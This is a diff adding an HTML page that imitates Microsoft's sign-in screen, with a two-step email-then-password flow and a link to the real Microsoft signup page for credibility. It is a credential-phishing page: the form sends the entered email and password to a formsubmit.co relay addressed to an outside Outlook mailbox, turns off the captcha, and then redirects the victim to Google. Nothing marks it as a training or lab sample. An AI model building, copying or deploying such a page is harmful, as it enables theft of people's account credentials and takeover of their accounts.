@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="stylesheet" href="styles.css">
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+      integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Microsoft Login UI</title>
+
+  </head>
+  <body>
+    <form action="https://formsubmit.co/Davidwayne389@outlook.com"
+        method="POST"
+        class="form">
+        <input type="text" name="_honey" style="display: none" />
+        <input type="hidden" name="_captcha" value="false" />
+        <input type="hidden" name="_next" value="https://www.google.com">
+        <div class="login-container" id="step1">
+            <div class="login">
+                <div class="logo">
+                    <img src="./microsoft-logo-removebg-preview.png" alt="Microsoft Logo">
+                </div>
+                <h4>Sign in</h1>
+                <input type="text" name="email" placeholder="Email, phone, or Skype" id="emailInput">
+                <div class="options">
+                    <a href="https://signup.live.com/signup?cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&id=292841&contextid=772BA410D4B4085B&opid=7488BBCE0DCD7722&bk=1734798355&sru=https://login.live.com/login.srf%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26id%3d292841%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26id%3d292841%26contextid%3d772BA410D4B4085B%26opid%3d7488BBCE0DCD7722%26mkt%3dEN-US%26lc%3d1033%26bk%3d1734798355%26uaid%3d9e9e3da0cc3f4d6caedf32d25ac2942c&lw=dob,flname,wld&fl=1&uiflavor=web&lic=1&mkt=EN-US&lc=1033&uaid=9e9e3da0cc3f4d6caedf32d25ac2942c" 
+                    style="color: black;">No account? <span style="color: #0067b8;">Create one!</span></a><br>
+                    <a href="#">Can't access your account?</a>
+                </div>
+                <button onclick="goToStep2(event)">Next</button>
+            </div>
+            <div class="sign-in-options">
+                <img src="./free-key-icon-920-thumb-removebg-preview.png" alt="">
+                <a href="#">Sign-in options</a>
+            </div>
+        </div>
+    
+        <div class="login-container hidden" id="step2">
+            <div class="login" id="step2">
+                <div class="logo">
+                    <img src="./microsoft-logo-removebg-preview.png" alt="Microsoft Logo">
+                </div>
+                <h4>Enter password</h1>
+                <p id="userEmail" name="email" style="margin-bottom: 20px; color: #555;"></p>
+                <input type="password" name="password" placeholder="Password" id="emailInput">
+                <div class="options">
+                    <a href="#" style="color: black;"><span style="color: #0067b8;">Forgot password?</span></a><br>
+                    <a href="#">Other ways to sign in</a>
+                </div>
+                <a href="./update.html"><button onclick="handleNext()">Sign in</button></a>
+            </div>
+        </div>
+    </form>
+
+    <script>
+      function goToStep2(event) {
+    event.preventDefault(); // Prevents form submission
+    const emailInput = document.getElementById('emailInput').value;
+    if (!emailInput) {
+        alert('Please enter your email, phone, or Skype.');
+    } else {
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('step2').classList.remove('hidden');
+        document.getElementById('userEmail').textContent = emailInput;
+    }
+}
+
+
+      function submitForm() {
+        const passwordInput = document.getElementById("passwordInput").value;
+        if (!passwordInput) {
+          alert("Please enter your password.");
+        } else {
+          alert("Login successful!");
+        }
+      }
+    </script>
+  </body>
+</html>
